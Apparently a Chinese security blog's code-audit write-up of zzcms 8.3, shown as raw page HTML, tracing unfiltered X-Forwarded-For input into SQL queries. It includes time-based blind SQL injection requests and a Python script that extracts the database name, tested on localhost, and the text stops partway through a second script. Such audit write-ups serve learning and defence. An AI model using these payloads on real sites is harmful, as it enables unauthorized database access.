@@ -1,0 +1,672 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="reader-l">
+  <meta name="keywords" content="reader-l&#39;s blog">
+  <title>[代码审计]zzcms8.3 - reader-l&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"reader-l.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="reader-l's blog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>reader-l's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/List/">
+                <i class="iconfont icon-link-fill"></i>
+                List
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="[代码审计]zzcms8.3">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-20 17:19" pubdate>
+        2020年5月20日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      44
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">[代码审计]zzcms8.3</h1>
+            
+              <p class="note note-info">
+                
+                  本文最后更新于：2020年6月17日 上午
+                
+              </p>
+            
+            <div class="markdown-body">
+              <h1 id><a href="#" class="headerlink" title></a><a id="more"></a></h1><h2 id="１．前言"><a href="#１．前言" class="headerlink" title="１．前言"></a>１．前言</h2><p>​    为了能够像学长一样牛，代码审计还是得坚持下去啊！</p>
+<h4 id="坚持以下下漏洞形成的条件"><a href="#坚持以下下漏洞形成的条件" class="headerlink" title="坚持以下下漏洞形成的条件"></a>坚持以下下漏洞形成的条件</h4><p>​    1.可以控制的变量【一切输入都是有害的 】<br>​    2.变量到达有利用价值的函数[危险函数]【一切进入函数的变量是<br>有害的】</p>
+<h2 id="２．审计流程"><a href="#２．审计流程" class="headerlink" title="２．审计流程"></a>２．审计流程</h2><p><strong>首先，</strong>我得指定一个代码审计的计划，因为我不想没有方向到处乱找／（ㄒｏㄒ）／～～这样会导致自己审计心态会奔溃的，因为代码审计是一项需要耐性的奋斗过程。</p>
+<h4 id="１．目标（不奢求按这个顺序找到指定的漏洞，但是先以这个方向尝试）"><a href="#１．目标（不奢求按这个顺序找到指定的漏洞，但是先以这个方向尝试）" class="headerlink" title="１．目标（不奢求按这个顺序找到指定的漏洞，但是先以这个方向尝试）"></a>１．目标（不奢求按这个顺序找到指定的漏洞，但是先以这个方向尝试）</h4><p>​        １．找sql注入漏洞</p>
+<p>​        ２．找xss漏洞</p>
+<p>​        ３．找文件上传漏洞</p>
+<p>​        ４．找命令执行漏洞</p>
+<p>​        ５．额外查看是否有其他问题</p>
+<p><strong>其次</strong>，用seay代码审计系统，将要审计的网站源码导入项目，然后点击自动审计。当审计完成时，我们需要根据自动审计的结果，按着目标进行逐一验证。当然，我们不需要真的每个文件都打开看过去，可以根据扫描报告中的漏洞详细信息来判断是否可能存在漏洞，如果你觉的某个地方可能存在，这时，我再打开具体文件查看。</p>
+<h2 id="３．审计前的小动作"><a href="#３．审计前的小动作" class="headerlink" title="３．审计前的小动作"></a>３．审计前的小动作</h2><p> 目录结构：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">/install</span> 安装程序目录（安装时必须有可写入权限）<br><span class="hljs-string">/admin</span> 默认后台管理目录（可任意改名）<br><span class="hljs-string">/user</span> 注册用户管理程序存放目录<br><span class="hljs-string">/skin</span> 用户网站模板存放目录;更多用户网站模板可从http:<span class="hljs-string">//www.zzcms.net/skin.asp</span> 下载<br><span class="hljs-string">/template</span> 系统模板存放目录;更多系统模板可从http:<span class="hljs-string">//www.zzcms.net/template.asp</span> 下载<br><span class="hljs-string">/inc</span> 系统所用包含文件存放目录<br><span class="hljs-string">/area</span> 各地区显示文件<br><span class="hljs-string">/zs</span> 招商程序文件<br><span class="hljs-string">/dl</span> 代理<br><span class="hljs-string">/zh</span> 展会<br><span class="hljs-string">/company</span> 企业<br><span class="hljs-string">/job</span> 招聘<br><span class="hljs-string">/zx</span> 资讯<br><span class="hljs-string">/special</span>专题<br><span class="hljs-string">/pp</span> 品牌<br><span class="hljs-string">/wangkan</span> 网刊<br><span class="hljs-string">/ask</span> 问答<br><span class="hljs-string">/zt</span> 注册用户展厅页程序<br><span class="hljs-string">/one</span> 专存放单页面，如公司简介页，友情链接页，帮助页都放在这个目录里了<br><span class="hljs-string">/ajax</span> ajax程序处理页面<br><span class="hljs-string">/reg</span> 用户注册页面<br><span class="hljs-string">/3</span> 第三方插件存放目录<br>	<span class="hljs-string">/3/ckeditor</span> CK编缉器程序存放目录<br>	<span class="hljs-string">/3/alipay</span> 支付宝在线支付系统存放目录<br>	<span class="hljs-string">/3/tenpay</span> 财富通在线支付系统存放目录<br>	<span class="hljs-string">/3/qq_connect2.0</span> qq登录接口文件<br>	<span class="hljs-string">/3/ucenter_api</span> discuz论坛用户同步登录接口文件<br>	<span class="hljs-string">/3/kefu</span> 在线客服代码<br>	<span class="hljs-string">/3/mobile_msg</span> 第三方手机短信API<br>	<span class="hljs-string">/3/phpexcelreader</span> PHP读取excel文件组件<br><span class="hljs-string">/cache</span> 缓存文件<br><span class="hljs-string">/uploadfiles</span> 上传文件存放目录<br><span class="hljs-string">/dl_excel</span> 要导入的代理信息excel表格文件上传目录<br><span class="hljs-string">/image</span> 程序设计图片,swf文件存放目录<br><span class="hljs-string">/flash</span> 展厅用透明flash装饰动画存放目录<br><span class="hljs-string">/js</span> js文件存放目录<br><span class="hljs-string">/html</span> 静态页存放目录<br><br><span class="hljs-string">/favicon.ico</span> 地址栏左侧小图标文件<br><span class="hljs-string">/web.config</span> 伪静态规则文件for iis7<span class="hljs-params">(万网比较常用)</span><br><span class="hljs-string">/httpd.ini</span>  伪静态规则文件for iss6<br><span class="hljs-string">/.htaccess</span>  伪静态规则文件for apache<br></code></pre></td></tr></table></figure>
+<h4 id="了解完网站主要的关键结构目录："><a href="#了解完网站主要的关键结构目录：" class="headerlink" title="了解完网站主要的关键结构目录："></a>了解完网站主要的关键结构目录：</h4><p>１．大部分函数在/inc/目录下，/user/目录是网站普通用户的注册管理等功能的所在目录，/admin/目录则是网站管理员大部分操作的所在目录。</p>
+<p>２．在index.php下，审计代码，并没有发现太多可以控制的变量，但是开头就包含了/inc/conn.php，跟进后发现该文件应该是该网站的初始化页面。在其中发现它包含许多关键文件，其中<code>stopsqlin.php</code>有可能是关于sql注入的防御文件。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/3.png" srcset="/img/loading.gif"></p>
+<p>３．跟进<code>stopsqlin.php</code>文件，以下这段代码中的zc_check()方法会先判断检查魔术引号功能是否开启，若是开启则用htmlspecialchars()方法进行处理，没开启的话则用addslashes()、htmlspecialchars()方法双重处理。同时该方法底下的if条件判断语句表示如果一个文件包含引用了stopsqlin.php，则会对当前页面所有的以POST/GET/COOKIE方式传递进来的用zc_check()进行处理。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">zc_check</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>	<span class="hljs-keyword">if</span>(!is_array(<span class="hljs-variable">$string</span>))&#123;<br>		<span class="hljs-keyword">if</span>(get_magic_quotes_gpc())&#123;<br>	 	<span class="hljs-keyword">return</span> htmlspecialchars(trim(<span class="hljs-variable">$string</span>));<br>		&#125;<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-keyword">return</span> addslashes(htmlspecialchars(trim(<span class="hljs-variable">$string</span>)));<br>		&#125;<br>	 &#125;<br>	<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$string</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>) <span class="hljs-variable">$string</span>[<span class="hljs-variable">$k</span>] = zc_check(<span class="hljs-variable">$v</span>);<br>	<span class="hljs-keyword">return</span> <span class="hljs-variable">$string</span>;<br>&#125;<br>	<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>)&#123;<br>	<span class="hljs-variable">$_POST</span> =zc_check(<span class="hljs-variable">$_POST</span>);<br>	<span class="hljs-variable">$_GET</span> =zc_check(<span class="hljs-variable">$_GET</span>);<br>	<span class="hljs-variable">$_COOKIE</span> =zc_check(<span class="hljs-variable">$_COOKIE</span>);<br>	@extract(<span class="hljs-variable">$_POST</span>);<br>	@extract(<span class="hljs-variable">$_GET</span>);	<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>４．用seay代码审计系统自动审计</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/1.png" srcset="/img/loading.gif"></p>
+<h2 id="４．漏洞分析与利用"><a href="#４．漏洞分析与利用" class="headerlink" title="４．漏洞分析与利用"></a>４．漏洞分析与利用</h2><h3 id="１．sql注入漏洞1"><a href="#１．sql注入漏洞1" class="headerlink" title="１．sql注入漏洞1"></a>１．sql注入漏洞1</h3><p>在/user/logincheck.php 18~21行</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/4.png" srcset="/img/loading.gif"></p>
+<p>我们可以看到在第21行，这段sql语句这个$ip参数值只是用单引号包裹，但是前面并没对$Ip进行检查，我们跟进getip()查看一下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from zzcms_login_times where ip=&#x27;<span class="hljs-subst">$ip</span>&#x27; and count&gt;=&quot;</span>.trytimes.<span class="hljs-string">&quot; and unix_timestamp()-unix_timestamp(sendtime)&lt;&quot;</span>.jgsj.<span class="hljs-string">&quot; &quot;</span>;<br></code></pre></td></tr></table></figure>
+<p>getip()方法在/inc/funtion.php文件100~113行，我们可以发现$ip是从请求头得到的，因此是可控的。并且并没有对ip进行检查过滤的。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/5.png" srcset="/img/loading.gif"></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>poc:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /user/logincheck.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">76</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">76</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">70</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">127.0.0.1</span>/user/login.php<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">1.1.1.1</span>&#x27; and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">122</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)#<br><span class="hljs-attribute">Cookie</span>: bdshare_firstime=<span class="hljs-number">1589879442882</span>; admin=admin; pass=<span class="hljs-number">21232</span>f<span class="hljs-number">297</span>a<span class="hljs-number">57</span>a<span class="hljs-number">5</span>a<span class="hljs-number">743894</span>a<span class="hljs-number">0</span>e<span class="hljs-number">4</span>a<span class="hljs-number">801</span>fc<span class="hljs-number">3</span>; XDEBUG_SESSION=PHPSTORM; PHPSESSID=ph<span class="hljs-number">9</span>j<span class="hljs-number">1</span>ng<span class="hljs-number">6</span>jabfc<span class="hljs-number">9</span>lgcf<span class="hljs-number">09</span>jsn<span class="hljs-number">553</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><br><span class="hljs-attribute">username</span>=test&amp;password=test&amp;yzm=<span class="hljs-number">25</span>&amp;fromurl=&amp;Submit=%E<span class="hljs-number">7</span>%<span class="hljs-number">99</span>%BB+%E<span class="hljs-number">5</span>%BD%<span class="hljs-number">95</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/6.png" srcset="/img/loading.gif"></p>
+<p>测试脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><span class="hljs-comment">#/user/logincheck.php</span><br>url = <span class="hljs-string">&quot;http://127.0.0.1/user/logincheck.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):<br>    flag = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">95</span>,<span class="hljs-number">123</span>):<br>        headers = &#123;<br>            <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;__51cke__=; __51laig__=3; __tins__713776=%7B%22sid%22%3A%201589956733983%2C%20%22vd%22%3A%203%2C%20%22pocires%22%3A%201589958558781%7D; bdshare_firstime=1589879442882; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; PHPSESSID=2h16rcd3rg3aod108qlehb63i2; XDEBUG_SESSION=PHPSTORM&quot;</span>,<br>            <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>:<span class="hljs-string">&quot;1.1.1.1&#x27; and if(ascii(substr(database(),%d,1))=%d,sleep(3),1)#&quot;</span>%(i,j)<br>            &#125;<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;test&#x27;</span>,<br>            <span class="hljs-string">&#x27;password&#x27;</span>:<span class="hljs-string">&#x27;test&#x27;</span>,<br>            <span class="hljs-string">&#x27;yzm&#x27;</span>:<span class="hljs-string">&#x27;16&#x27;</span>,<br>            <span class="hljs-string">&#x27;fromurl&#x27;</span>:<span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;Submit&#x27;</span>:<span class="hljs-string">&#x27;%E7%99%BB+%E5%BD%95&#x27;</span><br>        &#125;<br>        r = requests.post(url,data=data,headers=headers,)<br>        <span class="hljs-comment"># print(r.text)</span><br>        t = r.elapsed.total_seconds()<br>        <span class="hljs-keyword">if</span> t &gt;= <span class="hljs-number">3</span>:<br>            database = database + <span class="hljs-built_in">chr</span>(j)<br>            print(database)<br>            flag = <span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">if</span> flag == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> j == <span class="hljs-number">122</span>:<br>        print(<span class="hljs-string">&quot;[!]you got the database:&quot;</span>,database)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/7.png" srcset="/img/loading.gif"></p>
+<p>看到getip()会传入一个可控的参数，我就全局搜索以下getip()，看有哪些调用这个方法，看能不能借此再找几个。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/8.png" srcset="/img/loading.gif"></p>
+<p>拓展：在<code>admin/logincheck.php</code>也有类似的漏洞</p>
+<h3 id="２．sql注入漏洞２"><a href="#２．sql注入漏洞２" class="headerlink" title="２．sql注入漏洞２"></a>２．sql注入漏洞２</h3><p>漏洞存在/user/check.php页面下的１９行</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/9.png" srcset="/img/loading.gif"></p>
+<p>​    该漏洞和上面的第一个sql漏洞差不多，都是利用getip()方法中对前端请求头得到的ip没有进行检查，就直接拼接在sql语句里了。对check.php文件进行全局搜索可以发现有很多文件都有引用check.php。</p>
+<p><img src="/2020/05/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-zzcms8-3/10.png" srcset="/img/loading.gif"></p>
+<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我随便选择一个/user/adv2.php文件进行测试</p>
+<p>poc:</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /user/adv<span class="hljs-number">2</span>.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">127.0.0.1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (X<span class="hljs-number">11</span>; Linux x<span class="hljs-number">86</span>_<span class="hljs-number">64</span>; rv:<span class="hljs-number">76</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">76</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">1.1.1.1</span>&#x27; and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">123</span>,sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)#<br><span class="hljs-attribute">Cookie</span>: bdshare_firstime=<span class="hljs-number">1589879442882</span>; admin=admin; pass=<span class="hljs-number">21232</span>f<span class="hljs-number">297</span>a<span class="hljs-number">57</span>a<span class="hljs-number">5</span>a<span class="hljs-number">743894</span>a<span class="hljs-number">0</span>e<span class="hljs-number">4</span>a<span class="hljs-number">801</span>fc<span class="hljs-number">3</span>; XDEBUG_SESSION=PHPSTORM; PHPSESSID=ph<span class="hljs-number">9</span>j<span class="hljs-number">1</span>ng<span class="hljs-number">6</span>jabfc<span class="hljs-number">9</span>lgcf<span class="hljs-number">09</span>jsn<span class="hljs-number">553</span>; UserName=test; PassWord=<span class="hljs-number">098</span>f<span class="hljs-number">6</span>bcd<span class="hljs-number">4621</span>d<span class="hljs-number">373</span>cade<span class="hljs-number">4</span>e<span class="hljs-number">832627</span>b<span class="hljs-number">4</span>f<span class="hljs-number">6</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><br></code></pre></td></tr></table></figure>
+<p>poc:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#/user/adv2.php</span><br>url = <span class="hljs-string">&quot;http://127.0.0.1/user/adv2.php&quot;</span><br>database = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span 